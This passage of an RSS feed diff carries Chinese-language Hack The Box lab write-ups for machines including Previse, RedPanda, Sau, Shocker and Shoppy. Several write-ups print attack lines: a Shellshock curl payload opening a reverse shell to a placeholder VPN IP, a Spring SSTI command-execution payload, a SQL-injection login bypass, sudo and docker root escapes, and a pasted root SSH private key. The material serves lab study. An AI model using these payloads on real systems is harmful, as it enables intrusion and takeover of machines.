+&lt;/h2&gt;&lt;p&gt;在用户主目录下查看隐藏文件&lt;/p&gt;
+&lt;p&gt;ls -la&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;/home/ruby/.bundle&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;中有配置文件中含有henry的密码&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;ssh连接&lt;/font&gt;&lt;/p&gt;
+&lt;h1 id=&#34;font-stylecolorrgb36-36-36henry-rootfont&#34;&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;henry-&amp;gt;root&lt;/font&gt;
+&lt;/h1&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;sudo -l 查看可root文件&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;/opt/update_dependencies.rb&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;读文件可知这个文件能以root权限加载一个文件&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;dependencies.yml，现在创建一个木马文件&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;后sudo /usr/bin/ruby /opt/update_dependencies.rb&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;执行成功后第二步 /bin/bash -p&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;拿到root&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Previse</title>
+        <link>https://example.com/htb/previse/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/previse/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口正常，打开网页是个登录的页面，由php编写&lt;/p&gt;
+&lt;p&gt;尝试各种密码无反应&lt;/p&gt;
+&lt;p&gt;目录扫描时发现许多php页面都被重定向到了login.php的页面，并且重定向之前和之后的文件大小不一致&lt;/p&gt;
+&lt;p&gt;这里了解到**&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;重定向上的文件大小不一致是由称为 EAR 或 Execute After Redirect 漏洞的漏洞引起的。&lt;/font&gt;**&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;说明存在网页但是被重定向了，这里可以使用burp拦截重定向，然后把302代码改成200即可成功返回，也可使用curl 命令直接下载对应网页的源码进行分析，也可以直接在burp上读到注册用户的界面直接注册用户以便登录&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;用户登录后能寻找到一些源码，在logs.php中存在命令注入&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;直接在burp改到logs.php去添加执行参数试了很多的payload都没成功&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;最后面要到file_logs.php这里点击后再添加payload参数才会成功（猜测文件头的问题，但是我核对了很多都没发现到具体的参数头问题）&lt;/font&gt;&lt;/p&gt;
+&lt;h1 id=&#34;font-stylecolorrgb36-36-36权限提升font&#34;&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;权限提升&lt;/font&gt;
+&lt;/h1&gt;&lt;p&gt;进入的用户是www-data，没权限拿不到user.txt，但是在之前我们找到了服务器的配置文件，里面存放着mysql的用户密码，登录查看数据库里有没有存放着什么东西、&lt;/p&gt;
+&lt;p&gt;在这之前要把交互shell升级一下&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;python3 -c &amp;lsquo;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;不然mysql登录会很久很久，而且没有回显&lt;/p&gt;
+&lt;p&gt;在配置文件中的数据库中accounts表中找到了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/previse/1726478398351-1910db82-8599-4fa0-83f0-2780c602cfee.png&#34;
+	width=&#34;861&#34;
+	height=&#34;360&#34;
+	srcset=&#34;https://example.com/htb/previse/1726478398351-1910db82-8599-4fa0-83f0-2780c602cfee_hu04edfe01abf4480dbfe858f46e5ad85a_118599_480x0_resize_box_3.png 480w, https://example.com/htb/previse/1726478398351-1910db82-8599-4fa0-83f0-2780c602cfee_hu04edfe01abf4480dbfe858f46e5ad85a_118599_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;574px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;m4lwhere的hash密码&lt;/p&gt;
+&lt;p&gt;john爆破得到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/previse/1726478433630-1bfd171b-713b-4c34-bab0-b95f704c2b5b.png&#34;
+	width=&#34;975&#34;
+	height=&#34;322&#34;
+	srcset=&#34;https://example.com/htb/previse/1726478433630-1bfd171b-713b-4c34-bab0-b95f704c2b5b_huc9dfc40e058862ed44e516357e0b3fd9_94788_480x0_resize_box_3.png 480w, https://example.com/htb/previse/1726478433630-1bfd171b-713b-4c34-bab0-b95f704c2b5b_huc9dfc40e058862ed44e516357e0b3fd9_94788_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;302&#34;
+		data-flex-basis=&#34;726px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;之后ssh登录这个用户&lt;/p&gt;
+&lt;p&gt;sudo -l查看root权限文件&lt;/p&gt;
+&lt;p&gt;发现一个文件能用root权限gzip文件压缩日志&lt;/p&gt;
+&lt;p&gt;这时候我们可以伪造一&lt;img src=&#34;https://example.com/htb/previse/1726480329575-52d05faa-7b8e-4bdd-aecd-bb27070edc2e.png&#34;
+	width=&#34;548&#34;
+	height=&#34;238&#34;
+	srcset=&#34;https://example.com/htb/previse/1726480329575-52d05faa-7b8e-4bdd-aecd-bb27070edc2e_hu1320d71c63b2c7f2d92614f605841c4d_26056_480x0_resize_box_3.png 480w, https://example.com/htb/previse/1726480329575-52d05faa-7b8e-4bdd-aecd-bb27070edc2e_hu1320d71c63b2c7f2d92614f605841c4d_26056_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;230&#34;
+		data-flex-basis=&#34;552px&#34;
+	
+&gt;个gzip文件，让这个文件误以为是gzip工具，但其实是我们的提权手段&lt;/p&gt;
+&lt;p&gt;像这样&lt;/p&gt;
+&lt;p&gt;不过以sudo执行的文件，都是通过$PATH的路径&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;这意味着我们伪造的gzip提权文件只能放在系统环境的路径下执行才有效&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/previse/1726480499503-e3d57cf6-d8f3-46e1-9d68-23504f61e59c.png&#34;
+	width=&#34;1108&#34;
+	height=&#34;172&#34;
+	srcset=&#34;https://example.com/htb/previse/1726480499503-e3d57cf6-d8f3-46e1-9d68-23504f61e59c_hu8b66c19d9f449d78d6726a09a29f3452_62147_480x0_resize_box_3.png 480w, https://example.com/htb/previse/1726480499503-e3d57cf6-d8f3-46e1-9d68-23504f61e59c_hu8b66c19d9f449d78d6726a09a29f3452_62147_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;644&#34;
+		data-flex-basis=&#34;1546px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;正常的PATH路径我们没有权限写文件&lt;/p&gt;
+&lt;p&gt;但是这个系统我们可以人工添加一个path路径，然后再我们有权限写文件的路径下执行我们的提权文件&lt;/p&gt;
+&lt;p&gt;最后sudo 执行，成功拿到root&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/previse/1726480599066-24c2fcdf-6880-4fb3-9d6e-c3f1b4e4718e.png&#34;
+	width=&#34;1616&#34;
+	height=&#34;697&#34;
+	srcset=&#34;https://example.com/htb/previse/1726480599066-24c2fcdf-6880-4fb3-9d6e-c3f1b4e4718e_hue86ddf448d62a5ea2c58dcf03fe1442a_239381_480x0_resize_box_3.png 480w, https://example.com/htb/previse/1726480599066-24c2fcdf-6880-4fb3-9d6e-c3f1b4e4718e_hue86ddf448d62a5ea2c58dcf03fe1442a_239381_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;231&#34;
+		data-flex-basis=&#34;556px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;(别忘记改gzip文件的权限)&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>RedPanda</title>
+        <link>https://example.com/htb/redpanda/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/redpanda/</guid>
+        <description>&lt;p&gt;网站打开，搜索功能&lt;/p&gt;
+&lt;p&gt;网站源代码有 Spring boot的提示&lt;/p&gt;
+&lt;p&gt;猜测为ssti模板注入&lt;/p&gt;
+&lt;p&gt;用收集的java spring playload试一试&lt;/p&gt;
+&lt;p&gt;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&amp;lsquo;id&amp;rsquo;).getInputStream())}&lt;/p&gt;
+&lt;p&gt;这里的命令不能直接curl ip/shell |bash 执行&lt;/p&gt;
+&lt;p&gt;具体原因不清楚&lt;/p&gt;
+&lt;p&gt;但是可以先把reshell -o输出到/tmp文件夹下&lt;/p&gt;
+&lt;p&gt;然后再/bin/bash 执行这个反弹shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;总的来说是根据一个图片的xxe攻击拿root的ssh凭证&lt;/p&gt;
+&lt;p&gt;但是步骤太多了且对js代审不太了解，直接看wp拿到了&lt;/p&gt;
+&lt;p&gt;&amp;mdash;&amp;ndash;BEGIN OPENSSH PRIVATE KEY&amp;mdash;&amp;ndash;&lt;/p&gt;
+&lt;p&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW&lt;/p&gt;
+&lt;p&gt;QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29&lt;/p&gt;
+&lt;p&gt;ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ&lt;/p&gt;
+&lt;p&gt;AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ&lt;/p&gt;
+&lt;p&gt;RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=&lt;/p&gt;
+&lt;p&gt;&amp;mdash;&amp;ndash;END OPENSSH PRIVATE KEY&amp;mdash;&amp;ndash;&lt;/p&gt;
+&lt;p&gt;chmod 600&lt;/p&gt;
+&lt;p&gt;登录&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Sau</title>
+        <link>https://example.com/htb/sau/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/sau/</guid>
+        <description>&lt;p&gt;拿到网站扫描端口&lt;/p&gt;
+&lt;p&gt;22，80，55555&lt;/p&gt;
+&lt;p&gt;80打不开，55555端口跳转的web目录，得知该网站服务器是&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(240, 246, 252);&#34;&gt; &lt;/font&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/darklynx/request-baskets&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;request-baskets&lt;/a&gt;  &lt;a class=&#34;link&#34; href=&#34;https://github.com/advisories/GHSA-58g2-vgpg-335q&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;version 1.2.1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;得知存在一个&lt;/p&gt;
+&lt;p&gt;CVE-2023-27163&lt;/p&gt;
+&lt;p&gt;Request-baskets 是一个 Web 应用程序，用于收集和注册特定路由（即 basket）上的请求。创建请求时，用户可以指定其他服务器来转发请求。此处的问题是，用户可以指定意外的服务，例如网络关闭的应用程序。&lt;/p&gt;
+&lt;p&gt;用脚本生成一个地址以重定向到80端口让我们康康里面有什么好东西&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/sau/1726038716705-d50b8ebb-c186-47f6-aa95-b1d288c2f1a3.png&#34;
+	width=&#34;933&#34;
+	height=&#34;139&#34;
+	srcset=&#34;https://example.com/htb/sau/1726038716705-d50b8ebb-c186-47f6-aa95-b1d288c2f1a3_hu72eea406ff69f58f57e9ddfa3c865718_65403_480x0_resize_box_3.png 480w, https://example.com/htb/sau/1726038716705-d50b8ebb-c186-47f6-aa95-b1d288c2f1a3_hu72eea406ff69f58f57e9ddfa3c865718_65403_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;671&#34;
+		data-flex-basis=&#34;1610px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;打开给我们生成的网站，得知该网站是&lt;/p&gt;
+&lt;p&gt;Maltrail v0.53&lt;/p&gt;
+&lt;p&gt;搜索发现poc拿下shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h2 id=&#34;从puam-root&#34;&gt;从puam-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;sudo -l 查看root文件&lt;/p&gt;
+&lt;p&gt;发现有**/usr/bin/systemctl** status trail.service&lt;/p&gt;
+&lt;p&gt;直接执行&lt;/p&gt;
+&lt;p&gt;后输入!/bin/bash&lt;/p&gt;
+&lt;p&gt;等待些许拿到root&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/sau/1726040082868-cb507f07-81e8-4400-8703-38f032554d66.png&#34;
+	width=&#34;966&#34;
+	height=&#34;359&#34;
+	srcset=&#34;https://example.com/htb/sau/1726040082868-cb507f07-81e8-4400-8703-38f032554d66_hu4576ce9291b4ab10f59dc11634f03690_76000_480x0_resize_box_3.png 480w, https://example.com/htb/sau/1726040082868-cb507f07-81e8-4400-8703-38f032554d66_hu4576ce9291b4ab10f59dc11634f03690_76000_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;269&#34;
+		data-flex-basis=&#34;645px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Secret</title>
+        <link>https://example.com/htb/secret/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/secret/</guid>
+        <description>&lt;p&gt;页面下载源文件&lt;/p&gt;
+&lt;p&gt;有.git&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/secret/1733748867342-b03107da-43b9-4abb-8679-464addea1c5c.png&#34;
+	width=&#34;1336&#34;
+	height=&#34;789&#34;
+	srcset=&#34;https://example.com/htb/secret/1733748867342-b03107da-43b9-4abb-8679-464addea1c5c_hu73aa27be91f82ffd92a85e0a337d5982_220404_480x0_resize_box_3.png 480w, https://example.com/htb/secret/1733748867342-b03107da-43b9-4abb-8679-464addea1c5c_hu73aa27be91f82ffd92a85e0a337d5982_220404_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看日志&lt;/p&gt;
+&lt;p&gt;git show&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/secret/1733748906314-eea2c13a-e491-4d48-9dde-fc06b9ba31f1.png&#34;
+	width=&#34;1371&#34;
+	height=&#34;614&#34;
+	srcset=&#34;https://example.com/htb/secret/1733748906314-eea2c13a-e491-4d48-9dde-fc06b9ba31f1_hu5aa5d64cb50c0dcb99f22cad00f0ebba_199977_480x0_resize_box_3.png 480w, https://example.com/htb/secret/1733748906314-eea2c13a-e491-4d48-9dde-fc06b9ba31f1_hu5aa5d64cb50c0dcb99f22cad00f0ebba_199977_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;223&#34;
+		data-flex-basis=&#34;535px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现token密钥然后伪造admin身份&lt;/p&gt;
+&lt;p&gt;看源码logs有注入点&lt;/p&gt;
+&lt;p&gt;命令注入拿到shell 然后Pwnkit脚本提权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/secret/1733748968066-1534b984-319a-46c1-944a-3e7e7f26bb4f.png&#34;
+	width=&#34;2367&#34;
+	height=&#34;1283&#34;
+	srcset=&#34;https://example.com/htb/secret/1733748968066-1534b984-319a-46c1-944a-3e7e7f26bb4f_hu294659e5d250141ed655aa7bc9717a0a_193731_480x0_resize_box_3.png 480w, https://example.com/htb/secret/1733748968066-1534b984-319a-46c1-944a-3e7e7f26bb4f_hu294659e5d250141ed655aa7bc9717a0a_193731_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;184&#34;
+		data-flex-basis=&#34;442px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Shocker</title>
+        <link>https://example.com/htb/shocker/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/shocker/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口没有发现，打开网站同样&lt;/p&gt;
+&lt;p&gt;进行目录爆破&lt;/p&gt;
+&lt;p&gt;扫到了/cgi-bin&lt;/p&gt;
+&lt;p&gt;是一个常见的目录名称，通常在Web服务器上用于存放可执行的CGI（Common Gateway Interface）脚本。这些脚本允许Web服务器与外部程序进行交互，从而可以生成动态内容,重点关注&lt;/p&gt;
+&lt;p&gt;但是扫不到可以用的脚本，看wp发现有个user.sh可用（为什么我扫不到，同样的字典）&lt;/p&gt;
+&lt;p&gt;这个user.sh可以用curl.sh传递字符串，用shellshock漏洞拿到shell&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;curl -H &amp;lsquo;User-Agent: () { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/HTBoxVPNIP/1903 0&amp;gt;&amp;amp;1&amp;rsquo; &lt;a class=&#34;link&#34; href=&#34;http://shocker.htb/cgi-bin/user.sh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://shocker.htb/cgi-bin/user.sh&lt;/a&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;font-stylecolorrgb36-36-36background-colorrgb249-249-249权限提升font&#34;&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;权限提升&lt;/font&gt;
+&lt;/h1&gt;&lt;p&gt;sudo -l 看到可以用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;网上搜索知道&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;Perl 脚本仍然是为各种系统管理任务编写自动化任务脚本&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;语法为&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;perl -e &lt;/font&gt;&lt;font style=&#34;color:rgb(0, 0, 255);&#34;&gt;&amp;lt;Perl&lt;/font&gt;&lt;font style=&#34;color:red;&#34;&gt;code&lt;/font&gt;&lt;font style=&#34;color:rgb(0, 0, 255);&#34;&gt;&amp;gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;sudo perl -e &amp;rsquo;exec &amp;ldquo;/bin/sh&amp;rdquo;;&amp;lsquo;拿到root&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Shoppy</title>
+        <link>https://example.com/htb/shoppy/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/shoppy/</guid>
+        <description>&lt;p&gt;端口正常，有域名扫子域名&lt;/p&gt;
+&lt;p&gt;我用的11w的字典扫不到&lt;strong&gt;mattermost&lt;/strong&gt;这个字段？？&lt;/p&gt;
+&lt;p&gt;存在login登录界面&lt;/p&gt;
+&lt;p&gt;sql注入试一下&lt;/p&gt;
+&lt;p&gt;admin&amp;rsquo; || &amp;lsquo;1&amp;rsquo; ==&amp;lsquo;1&lt;/p&gt;
+&lt;p&gt;这个playload能行&lt;/p&gt;
+&lt;p&gt;登录后有个搜索界面，能搜到用户的md5hash密码&lt;/p&gt;
+&lt;p&gt;admin用户&lt;/p&gt;
+&lt;p&gt;再sql注入一下试试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/shoppy/1729772813885-95e13102-5bfb-413e-9084-a1d7690b8d19.png&#34;
+	width=&#34;944&#34;
+	height=&#34;859&#34;
+	srcset=&#34;https://example.com/htb/shoppy/1729772813885-95e13102-5bfb-413e-9084-a1d7690b8d19_hufa59465ecf10622e3d238bf063938d84_125559_480x0_resize_box_3.png 480w, https://example.com/htb/shoppy/1729772813885-95e13102-5bfb-413e-9084-a1d7690b8d19_hufa59465ecf10622e3d238bf063938d84_125559_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/shoppy/1729772830435-4029a381-8832-4b99-9ccf-bfe4913d3915.png&#34;
+	width=&#34;981&#34;
+	height=&#34;842&#34;
+	srcset=&#34;https://example.com/htb/shoppy/1729772830435-4029a381-8832-4b99-9ccf-bfe4913d3915_hube1f5b6e3e0e278b19084809ae87e3ab_435636_480x0_resize_box_3.png 480w, https://example.com/htb/shoppy/1729772830435-4029a381-8832-4b99-9ccf-bfe4913d3915_hube1f5b6e3e0e278b19084809ae87e3ab_435636_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;116&#34;
+		data-flex-basis=&#34;279px&#34;
+	
+&gt;切换到deploy，该用户在docker用户组&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/shoppy/1729772876297-b4f9af4f-0ca0-4ea3-8142-2848961cc48a.png&#34;
+	width=&#34;1215&#34;
+	height=&#34;931&#34;
+	srcset=&#34;https://example.com/htb/shoppy/1729772876297-b4f9af4f-0ca0-4ea3-8142-2848961cc48a_hud63e96d8516f56af661222130e9a9c06_58075_480x0_resize_box_3.png 480w, https://example.com/htb/shoppy/1729772876297-b4f9af4f-0ca0-4ea3-8142-2848961cc48a_hud63e96d8516f56af661222130e9a9c06_58075_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;130&#34;
+		data-flex-basis=&#34;313px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用这个运行root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SolidState</title>
+        <link>https://example.com/htb/solidstate/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/solidstate/</guid>
+        <description>&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;JAMES 2.3.2&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;存在root/root&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;扫全部端口4555改密码&lt;/p&gt;
+&lt;p&gt;110拿到半shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/solidstate/1729931574679-eb19117e-a15a-4323-99ac-fa5e29ed999e.png&#34;
+	width=&#34;513&#34;
+	height=&#34;44&#34;
+	srcset=&#34;https://example.com/htb/solidstate/1729931574679-eb19117e-a15a-4323-99ac-fa5e29ed999e_hubb067f02857cb420048049a8f3ae5a8b_6083_480x0_resize_box_3.png 480w, https://example.com/htb/solidstate/1729931574679-eb19117e-a15a-4323-99ac-fa5e29ed999e_hubb067f02857cb420048049a8f3ae5a8b_6083_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1165&#34;
+		data-flex-basis=&#34;2798px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;rbash转bash&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;pspy32&lt;/p&gt;
+&lt;p&gt;看系统进程得知运行一个py文件，我们可以改写&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/solidstate/1729931635945-3c04261b-5287-4ea9-b3b0-1086c20ceddc.png&#34;
+	width=&#34;1068&#34;
+	height=&#34;368&#34;
+	srcset=&#34;https://example.com/htb/solidstate/1729931635945-3c04261b-5287-4ea9-b3b0-1086c20ceddc_hu1b7bd4e4d809cd751b04e19b4fc35b2d_78695_480x0_resize_box_3.png 480w, https://example.com/htb/solidstate/1729931635945-3c04261b-5287-4ea9-b3b0-1086c20ceddc_hu1b7bd4e4d809cd751b04e19b4fc35b2d_78695_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;290&#34;
+		data-flex-basis=&#34;696px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Stocker</title>
+        <link>https://example.com/htb/stocker/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/stocker/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
